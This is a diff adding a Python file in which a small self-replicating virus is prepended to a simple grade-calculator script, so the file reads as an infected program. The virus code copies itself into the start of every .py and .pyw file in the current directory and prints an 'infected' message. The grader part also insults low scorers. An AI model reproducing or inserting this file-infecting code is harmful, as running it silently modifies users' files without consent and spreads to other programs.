@@ -1,0 +1,59 @@
+# VIRUS SAYS HI!
+
+import sys
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line == "# VIRUS SAYS HI!":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# VIRUS SAYS BYE!\n":
+        break
+
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line == "# VIRUS SAYS HI!\n":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+
+
+def malicious_code():
+    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
+
+
+malicious_code()
+
+# VIRUS SAYS BYE!
+Score = float(input("Write your grade number here: "))
+
+if Score >= 90:
+   print("Your score is an A, oustanding performance i woud say my self")
+elif Score >= 80:
+   print("Your score is a B, Good grade kid im proud of ya but there still one more higher than this")
+elif Score >= 65:
+   print("Your score is a C, at least its not a D but still work on your grade")
+else:
+   print("Your score is a D, so go study you moron")
